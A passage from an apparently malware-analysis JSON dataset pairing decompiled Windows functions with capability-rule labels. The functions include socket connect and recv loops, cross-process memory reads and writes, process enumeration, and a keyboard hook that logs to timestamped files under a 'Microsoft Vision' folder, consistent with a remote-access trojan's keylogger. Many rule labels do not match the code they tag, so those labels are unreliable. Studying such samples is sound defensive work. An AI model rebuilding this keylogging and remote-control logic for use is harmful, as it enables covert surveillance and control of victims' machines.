        "decompiled_code": "\nuint __cdecl fcn.0040c30d(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EDX;\n    uint uVar3;\n    int32_t lpFileSize;\n    int32_t var_ch;\n    int32_t lpNumberOfBytesRead;\n    int32_t *hMem;\n    \n    uVar3 = 0;\n    if (*0x42696c == 0) {\n        hMem = in_EDX;\n        iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)();\n        if ((iVar1 != 0) && (iVar1 != -1)) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetFileSizeEx)(iVar1, &lpFileSize);\n            if ((iVar2 != 0) && (var_ch == 0)) {\n                *arg_8h = lpFileSize;\n                iVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, lpFileSize);\n                *hMem = iVar2;\n                if (iVar2 != 0) {\n                    iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar1, iVar2, *arg_8h, &lpNumberOfBytesRead, 0);\n                    if ((iVar2 == 0) || (*arg_8h != lpNumberOfBytesRead)) {\n                        (*_sym.imp.KERNEL32.dll_LocalFree)(*hMem);\n                    }\n                    else {\n                        uVar3 = 1;\n                    }\n                }\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        }\n    }\n    else {\n        uVar3 = fcn.0040c3b9(arg_8h);\n    }\n    return uVar3;\n}\n",
        "token_count": 379
    },
    "0040cf43": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040cf43(uint *arg_8h)\n\n{\n    char cVar1;\n    int32_t buf;\n    uint var_1000h;\n    uint uStackY32;\n    uint uStackY28;\n    uint *puStackY24;\n    uint uStackY20;\n    \n    fcn.004011c0();\n    puStackY24 = &fcn.0040cf43::var_1000h;\n    uStackY20 = 0;\n    uStackY28 = 0x40cf66;\n    fcn.00401052();\n    while( true ) {\n        puStackY24 = &fcn.0040cf43::var_1000h;\n        uStackY20 = 0x1000;\n        uStackY28 = *arg_8h;\n        uStackY32 = 0x40cfa3;\n        buf = (*_sym.imp.WS2_32.dll_recv)();\n        if (buf == -1) {\n            return 0;\n        }\n        uStackY20 = 0x40cf7a;\n        cVar1 = fcn.0040d14d(buf);\n        if (cVar1 == '\\0') break;\n        puStackY24 = &fcn.0040cf43::var_1000h;\n        uStackY20 = 0;\n        uStackY28 = 0x40cf8e;\n        fcn.00401052();\n    }\n    return 0;\n}\n",
        "token_count": 323
    },
    "0040cfb0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040cfb0(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t buf;\n    uint var_1000h;\n    uint uStackY32;\n    uint uStackY28;\n    uint *puStackY24;\n    uint uStackY20;\n    \n    fcn.004011c0();\n    puStackY24 = &fcn.0040cfb0::var_1000h;\n    uStackY20 = 0;\n    uStackY28 = 0x40cfd3;\n    fcn.00401052();\n    while( true ) {\n        puStackY24 = &fcn.0040cfb0::var_1000h;\n        uStackY20 = 0x1000;\n        uStackY28 = *(arg_8h + 4);\n        uStackY32 = 0x40d010;\n        buf = (*_sym.imp.WS2_32.dll_recv)();\n        if (buf == -1) {\n            return 0;\n        }\n        uStackY20 = 0x40cfe6;\n        cVar1 = fcn.0040d14d(buf);\n        if (cVar1 == '\\0') break;\n        puStackY24 = &fcn.0040cfb0::var_1000h;\n        uStackY20 = 0;\n        uStackY28 = 0x40cffa;\n        fcn.00401052();\n    }\n    return 0;\n}\n",
        "token_count": 330
    },
    "0040ee24": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ee24(uint nNumberOfBytesToWrite)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint *in_EDX;\n    uint uVar4;\n    uint hMem;\n    uint var_8h;\n    uint lpNumberOfBytesWritten;\n    \n    uVar4 = 0;\n    piVar1 = in_ECX[1];\n    iVar2 = *piVar1;\n    if (iVar2 != 0) {\n        if (iVar2 == 1) {\n            if (*in_EDX[1] == 0) {\n                uVar4 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)\n                                  (*piVar1[1], *in_ECX, *in_EDX, nNumberOfBytesToWrite, 0);\n                return uVar4;\n            }\n        }\n        else if (iVar2 != 3) {\n            if (iVar2 != 6) {\n                return 0;\n            }\n            if (*in_EDX[1] == 0) {\n                if ((*in_ECX != 0) &&\n                   (iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(*piVar1[1], *in_ECX, 0, 0),  iVar2 == 0)) {\n                    return 0;\n                }\n                uVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)\n                                  (**(in_ECX[1] + 4), *in_EDX, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n                return uVar4;\n            }\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, nNumberOfBytesToWrite);\n        if (iVar2 != 0) {\n            iVar3 = fcn.0040ee24(nNumberOfBytesToWrite);\n            if (iVar3 != 0) {\n                uVar4 = fcn.0040ee24(nNumberOfBytesToWrite);\n            }\n            (*_sym.imp.KERNEL32.dll_LocalFree)(iVar2);\n        }\n        return uVar4;\n    }\n    piVar1 = in_EDX[1];\n    iVar2 = *piVar1;\n    if (iVar2 == 0) {\n        fcn.0040102c(*in_ECX, *in_EDX, nNumberOfBytesToWrite);\n        return 1;\n    }\n    if (iVar2 == 1) {\n        uVar4 = (*_sym.imp.KERNEL32.dll_ReadProcessMemory)(*piVar1[1], *in_EDX, *in_ECX, nNumberOfBytesToWrite, 0);\n        return uVar4;\n    }\n    if (iVar2 != 6) {\n        return 0;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(*piVar1[1], *in_EDX, 0, 0);\n    if (iVar2 == -1) {\n        return 0;\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_ReadFile)\n                      (**(in_EDX[1] + 4), *in_ECX, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n    return uVar4;\n}\n",
        "token_count": 712
    },
    "00410363": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410363(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uchar auStack408 [404];\n    \n    (*_sym.imp.WS2_32.dll_WSAStartup)(2, auStack408);\n    iVar1 = fcn.004103b9();\n    if (iVar1 == -1) {\n        (*_sym.imp.WS2_32.dll_WSACleanup)();\n    }\n    fcn.00401052(0x426980, 0, 0x13332c);\n    fcn.0041046e();\n    return;\n}\n",
        "token_count": 129
    },
    "0041075c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0041075c(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_10h;\n    uint s;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    s = *0x559cac;\n    var_4h = fcn.00401085(0x2000);\n    arg_ch = fcn.00401085(0x2000);\n    var_10h = 0;\n    var_8h = 0;\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    arg_8h[2] = 0;\n    iVar3 = 0;\n    while( true ) {\n        iVar2 = (*_sym.imp.WS2_32.dll_recv)(s, arg_ch, 8 - iVar3, 0);\n        if (iVar2 == 0) {\n            *0x426755 = 0;\n            return arg_8h;\n        }\n        if (iVar2 == -1) break;\n        fcn.0040102c(var_4h + iVar3, arg_ch, iVar2);\n        iVar1 = var_4h;\n        iVar3 = iVar3 + iVar2;\n        if (7 < iVar3) {\n            fcn.0040102c(&var_10h, var_4h, 4);\n            fcn.0040102c(&var_8h, iVar1 + 4, 4);\n            iVar3 = 0;\n            if (0 < var_8h) {\n                do {\n                    iVar2 = (*_sym.imp.WS2_32.dll_recv)(s, arg_ch, var_8h - iVar3, 0);\n                    if ((iVar2 == 0) || (iVar2 == -1)) {\n                        *0x426755 = 0;\n                        return arg_8h;\n                    }\n                    fcn.0040102c(var_4h + iVar3, arg_ch, iVar2);\n                    iVar3 = iVar3 + iVar2;\n                } while (iVar3 < var_8h);\n            }\n            arg_8h[1] = var_8h;\n            *arg_8h = var_10h;\n            arg_8h[2] = var_4h;\n            fcn.00401099(arg_ch);\n            return arg_8h;\n        }\n    }\n    *0x426755 = 0;\n    return arg_8h;\n}\n",
        "token_count": 564
    },
    "0041085b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0041085b(uint param_1, ushort param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_820h;\n    uint name;\n    uint var_14h;\n    \n    uVar1 = (*_sym.imp.WS2_32.dll_socket)(0x17, 1, 6);\n    name._0_2_ = 0x17;\n    fcn.0040102c(&var_14h, param_1, 0x10);\n    name._2_2_ = param_2;\n    iVar2 = (*_sym.imp.WS2_32.dll_connect)(uVar1, &name, 0x1c);\n    if (iVar2 != -1) {\n        fcn.00401052(&var_820h, 0, 0x802);\n        (*_sym.imp.WS2_32.dll_InetNtopW)(0x17, &var_14h, &var_820h, 0x802);\n    }\n    return uVar1;\n}\n",
        "token_count": 246
    },
    "004108dc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004108dc(uint *param_1, ushort param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_818h;\n    uint name;\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *param_1;\n    uVar1 = (*_sym.imp.WS2_32.dll_socket)(2, 1, 6);\n    name._0_2_ = 2;\n    var_10h = var_4h;\n    name._2_2_ = param_2;\n    iVar2 = (*_sym.imp.WS2_32.dll_connect)(uVar1, &name, 0x10);\n    if (iVar2 != -1) {\n        fcn.00401052(&var_818h, 0, 0x802);\n        (*_sym.imp.WS2_32.dll_InetNtopW)(2, &var_4h, &var_818h, 0x802);\n    }\n    return uVar1;\n}\n",
        "token_count": 245
    },
    "00410bbe": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00410bbe(uint *param_1, uint *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(*param_1, 0, 2);\n    if (((iVar2 != -1) && (iVar3 = (*_sym.imp.KERNEL32.dll_FindResourceW)(iVar2, 1, 0x10),  iVar3 != 0)) &&\n       (iVar3 = (*_sym.imp.KERNEL32.dll_LoadResource)(iVar2, iVar3),  iVar3 != 0)) {\n        uVar1 = *(iVar3 + 0x28);\n        *param_2 = *(iVar3 + 0x14);\n        *(param_2 + 1) = *(iVar3 + 0x1a);\n        *(param_2 + 6) = *(iVar3 + 0x18);\n        param_2[2] = uVar1 & 1;\n        param_2[3] = uVar1 >> 1 & 1;\n        param_2[4] = uVar1 >> 3 & 1;\n        param_2[5] = uVar1 >> 5 & 1;\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar2);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 313
    },
    "0041130f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0041130f(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(param_1 + 4), 0xc0000000, 1, 0, 1, 0, 0);\n    *(param_1 + 8) = iVar1;\n    if ((iVar1 == -1) && (iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar1 == 0x50)) {\n        *(param_1 + 8) = 0;\n        uVar2 = fcn.004116b1(0xc0000000);\n        return uVar2;\n    }\n    return *(param_1 + 8) != -1;\n}\n",
        "token_count": 187
    },
    "00411446": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00411446(uint lpFileName)\n\n{\n    int32_t iVar1;\n    uint arg_8h;\n    int32_t iVar2;\n    bool bVar3;\n    uint *arg_8h_00;\n    uint in_stack_fffffd40;\n    uint in_stack_fffffd44;\n    uint lpFindFileData;\n    uint var_268h;\n    uint var_264h;\n    uint var_258h;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_10h = 0;\n    var_ch = 5;\n    var_14h = 5;\n    fcn.004018c7();\n    iVar1 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n    bVar3 = iVar1 == -1;\n    while (!bVar3) {\n        var_34h = 0;\n        bVar3 = (lpFindFileData & 0x10) == 0;\n        if (bVar3) {\n            _var_2ch = CONCAT44(var_268h, var_264h);\n        }\n        else {\n            _var_2ch = 0;\n        }\n        var_24h = !bVar3;\n        arg_8h = fcn.004036f7(&var_258h);\n        fcn.00403549(arg_8h);\n        fcn.00405feb();\n        var_8h = 0;\n        arg_8h_00 = &var_34h;\n        fcn.0040373f(arg_8h_00);\n        fcn.004017c8(arg_8h_00, in_stack_fffffd40, in_stack_fffffd44, var_2ch, var_28h);\n        fcn.00405feb();\n        iVar2 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar1, &lpFindFileData);\n        bVar3 = iVar2 == 0;\n    }\n    fcn.004013b3(&var_18h);\n    if (var_18h != 0) {\n        fcn.00401b27(var_18h);\n    }\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 553
    },
    "004116b1": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004116b1(uint dwDesiredAccess)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(in_ECX + 4), dwDesiredAccess, 1, 0, 3, 0, 0);\n    *(in_ECX + 8) = iVar1;\n    if (iVar1 == -1) {\n        *(in_ECX + 8) = 0;\n    }\n    else {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar1, 0);\n        *(in_ECX + 0x14) = uVar2;\n    }\n    return iVar1 != -1;\n}\n",
        "token_count": 174
    },
    "004116f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004116f0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(param_1 + 4), 0x40000000, 1, 0, 2, 0, 0);\n    *(param_1 + 8) = iVar1;\n    if (iVar1 == -1) {\n        *(param_1 + 8) = 0;\n    }\n    return iVar1 != -1;\n}\n",
        "token_count": 120
    },
    "004117b7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.004117b7(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0, 0);\n    *param_1 = iVar1;\n    param_1[1] = iVar1 != -1;\n    return param_1;\n}\n",
        "token_count": 85
    },
    "00412155": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00412155(uint *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_22ch;\n    uint var_224h;\n    uint lpsz;\n    \n    var_22ch = 0x22c;\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    if (iVar1 != -1) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(iVar1, &var_22ch);\n        while (iVar2 != 0) {\n            uVar3 = (*_sym.imp.USER32.dll_CharLowerW)(*param_1);\n            uVar3 = (*_sym.imp.USER32.dll_CharLowerW)(&lpsz, uVar3);\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(uVar3);\n            if (iVar2 == 0) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n                return var_224h;\n            }\n            iVar2 = (*_sym.imp.KERNEL32.dll_Process32NextW)(iVar1, &var_22ch);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return 0;\n}\n",
        "token_count": 287
    },
    "0041221f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.0041221f(uint *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_22ch;\n    int32_t var_224h;\n    uint var_208h;\n    \n    var_22ch = 0x22c;\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    if (iVar1 != -1) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(iVar1, &var_22ch);\n        while (iVar2 != 0) {\n            if (var_224h == param_2) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n                fcn.004036f7(&var_208h);\n                return param_1;\n            }\n            iVar2 = (*_sym.imp.KERNEL32.dll_Process32NextW)(iVar1, &var_22ch);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    *param_1 = 0;\n    return param_1;\n}\n",
        "token_count": 256
    },
    "004122ca": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004122ca(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *arg_8h;\n    uint *arg_8h_00;\n    uint var_668h;\n    uint var_258h;\n    uint var_254h;\n    uint dwProcessId;\n    uint var_234h;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401052(&var_254h, 0, 0x228);\n    var_258h = 0x22c;\n    var_20h = 0;\n    var_1ch = 5;\n    var_24h = 5;\n    fcn.00401735();\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    if (iVar1 != -1) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(iVar1, &var_258h);\n        if (iVar2 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            fcn.0040136c(&var_28h);\n            if (var_28h == 0) {\n                return param_1;\n            }\n            for (iVar1 = *(var_28h + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n                fcn.00401468();\n            }\n            return param_1;\n        }\n        do {\n            var_8h = 0;\n            var_ch = dwProcessId;\n            var_4h = var_8h;\n            fcn.00403411(&var_234h);\n            iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1410, 0, dwProcessId);\n            if (iVar2 == -1) {\n                uVar4 = fcn.004036f7(0x417ba4);\n                fcn.00403549(uVar4);\n                fcn.00405feb();\n                var_18h = 0;\n            }\n            else {\n                fcn.00401052(&var_668h, 0, 0x410);\n                iVar3 = (*_sym.imp.PSAPI.DLL_GetModuleFileNameExW)(iVar2, 0, &var_668h, 0x208);\n                if (iVar3 == 0) {\n                    uVar4 = fcn.004036f7(0x417ba4);\n                    fcn.00403549(uVar4);\n                    fcn.00405feb();\n                    var_14h = 0;\n                }\n                else {\n                    uVar4 = fcn.004036f7(&var_668h);\n                    fcn.00403549(uVar4);\n                    fcn.00405feb();\n                    var_10h = 0;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            }\n            arg_8h_00 = &var_8h;\n            uVar4 = var_ch;\n            fcn.0040373f(arg_8h_00);\n            arg_8h = &var_4h;\n            fcn.0040373f(arg_8h);\n            fcn.00401612(arg_8h, arg_8h_00, uVar4);\n            fcn.00401468();\n            iVar2 = (*_sym.imp.KERNEL32.dll_Process32NextW)(iVar1, &var_258h);\n        } while (iVar2 != 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    fcn.0040136c(&var_28h);\n    if (var_28h != 0) {\n        for (iVar1 = *(var_28h + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n            fcn.00401468();\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 940
    },
    "004133b6": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004133b6(uint nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    uint lpNumberOfBytesWritten;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_WriteFile)(iVar1);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "004133f9": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004133f9(uint nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    uint lpNumberOfBytesWritten;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)();\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_WriteFile)(iVar1);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "004134a2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004134a2(uint param_1, uint *param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint lpNumberOfBytesRead;\n    \n    lpNumberOfBytesRead = param_1;\n    uVar1 = fcn.00401085(0x400000);\n    lpNumberOfBytesRead = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileA)(param_1, 0x80000000, 0, 0, 3, 0x80, 0);\n    if (iVar2 == -1) {\n        *param_2 = 0;\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar2, 0);\n    *param_2 = uVar3;\n    iVar4 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, uVar1, uVar3, &lpNumberOfBytesRead, 0);\n    if (iVar4 == 0) {\n        *param_2 = 0;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    return uVar1;\n}\n",
        "token_count": 268
    },
    "00404772": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404772(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStack96;\n    uchar auStack92 [4];\n    uchar auStack88 [4];\n    uchar auStack84 [52];\n    uint uStack32;\n    uint uStack28;\n    uchar auStack24 [16];\n    \n    uStack28 = 0;\n    uStack32 = 0x11;\n    arg_ch = 0;\n    auStack24 = ZEXT816(0);\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            arg_8h_00 = fcn.004015d3(&uStack96, arg_ch);\n            fcn.00403873(arg_8h_00);\n            fcn.00405feb();\n            iVar1 = fcn.004015d3(auStack92, arg_ch);\n            fcn.00403852(*(iVar1 + 4));\n            fcn.00405feb();\n            iVar1 = fcn.004015d3(auStack88, arg_ch);\n            fcn.00403852(*(iVar1 + 8));\n            fcn.00405feb();\n            iVar1 = fcn.004015d3(auStack84, arg_ch);\n            fcn.00403852(*(iVar1 + 0xc));\n            fcn.00405feb();\n            uStack96 = 0;\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0xc));\n    }\n    fcn.0040378b(arg_8h);\n    fcn.00403777();\n    return arg_8h;\n}\n",
        "token_count": 388
    },
    "00407f94": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint fcn.00407f94(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint extraout_ECX;\n    uint32_t uStack292;\n    uint32_t uStack288;\n    uint32_t uStack284;\n    uint32_t uStack276;\n    uchar *puStack272;\n    uchar *puStack268;\n    int32_t iStack264;\n    char16_t *pcStack260;\n    uint uStack256;\n    uint uStack252;\n    uint32_t uStack248;\n    uint32_t uStack244;\n    uint32_t uStack240;\n    uint32_t uStack236;\n    uint uStack204;\n    \n    uStack236 = 0;\n    uStack240 = 0x407fab;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    uStack248 = *0x42675c + 0x210;\n    uStack240 = 0x800;\n    uStack204 = 0;\n    uStack244 = 0;\n    uStack252 = 0x407fd1;\n    fcn.00401052();\n    uStack248 = *0x42675c + 0x10;\n    uStack240 = 0x208;\n    uStack244 = 0;\n    uStack252 = 0x407fe8;\n    fcn.00401052();\n    uStack240 = *0x42675c + 0x10;\n    uStack244 = 0;\n    uStack248 = 0;\n    uStack252 = 0x1c;\n    uStack256 = 0;\n    pcStack260 = 0x407fff;\n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)();\n    pcVar1 = _sym.imp.KERNEL32.dll_lstrcatW;\n    iStack264 = *0x42675c + 0x10;\n    pcStack260 = L\"\\\\Microsoft Vision\\\\\";\n    puStack268 = 0x408015;\n    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n    puStack268 = &stack0xffffff0c;\n    puStack272 = 0x408020;\n    (*_sym.imp.KERNEL32.dll_GetLocalTime)();\n    puStack272 = uStack236 & 0xffff;\n    uStack276 = uStack240 >> 0x10;\n    uStack284 = uStack248 & 0xffff;\n    uStack288 = uStack248 >> 0x10;\n    uStack292 = uStack244 >> 0x10;\n    (*_sym.imp.USER32.dll_wsprintfW)(&stack0xffffff34, L\"%02d-%02d-%02d_%02d.%02d.%02d\");\n    puStack272 = &stack0xffffff34;\n    uStack276 = *0x42675c + 0x10;\n    (*pcVar1)();\n    uStack284 = 0x408079;\n    fcn.00403411(*0x42675c + 0x10);\n    uStack284 = 0;\n    uStack288 = 0x80;\n    uStack292 = 2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(*0x42675c + 0xc), 0x10000000, 1, 0);\n    *(*0x42675c + 4) = uVar3;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    fcn.004134a2();\n    iVar4 = fcn.00411ef1();\n    if (iVar4 != 0) {\n        *0x426758 = fcn.00411e88(extraout_ECX);\n    }\n    (**0x426758)(0xd, fcn.00408125, uVar2, 0);\n    pcVar1 = _sym.imp.USER32.dll_GetMessageA;\n    while (iVar4 = (*pcVar1)(&stack0xfffffeec, 0, 0, 0),  0 < iVar4) {\n        (*_sym.imp.USER32.dll_TranslateMessage)(&stack0xfffffedc);\n        (*_sym.imp.USER32.dll_DispatchMessageA)(&stack0xfffffef0);\n    }\n    return 0;\n}\n",
        "token_count": 940
    },
    "0040c4ae": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
